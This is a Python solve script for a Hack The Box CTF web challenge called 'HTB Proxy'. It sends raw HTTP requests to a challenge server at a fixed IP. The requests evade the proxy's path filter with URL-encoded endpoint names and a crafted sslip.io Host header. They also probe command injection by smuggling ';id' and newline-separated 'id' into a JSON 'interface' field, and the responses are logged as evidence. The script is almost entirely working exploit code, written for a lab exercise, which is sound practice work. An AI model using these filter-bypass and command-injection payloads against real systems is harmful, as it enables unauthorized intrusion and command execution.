import socket
from pathlib import Path

ip, port = "154.57.164.77", 32208
out = Path(r"D:\download\CTFTimeWriteup\HTB-TryOut\web\HTB Proxy\solve\evidence")
out.mkdir(parents=True, exist_ok=True)
HOST = "10-244-40-122.sslip.io:5000"


def raw(payload, timeout=10):
    s = socket.create_connection((ip, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(payload)
    chunks = []
    try:
        while True:
            b = s.recv(4096)
            if not b:
                break
            chunks.append(b)
    except socket.timeout:
        pass
    s.close()
    return b"".join(chunks)


def post(path, body, host=HOST):
    bb = body.encode()
    req = (
        f"{path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(bb)}\r\nConnection: close\r\n\r\n"
    ).encode() + bb
    resp = raw(req)
    return len(req), resp


tests = [
    ("encoded_flush", "POST /flush%49nterface", '{"interface":"x"}'),
    ("plain_flush", "POST /flushInterface", '{"interface":"x"}'),
    ("f_encoded", "POST /%66lushInterface", '{"interface":"x"}'),
    ("getAddr", "POST /getAddresses", "{}"),
    ("cmdi_id", "POST /flush%49nterface", '{"interface":"x\\u003bid"}'),
    ("cmdi_n", "POST /flush%49nterface", '{"interface":"x\\nid"}'),
]

for name, path, body in tests:
    n, resp = post(path, body)
    excerpt = resp[:400].decode("latin1", "replace")
    (out / f"dbg_{name}.txt").write_text(f"REQ_LEN={n}\n{excerpt}", encoding="utf-8")
    first = excerpt.splitlines()[0] if excerpt else "empty"
    print(f"Q: {name}? |+ {first} | -")
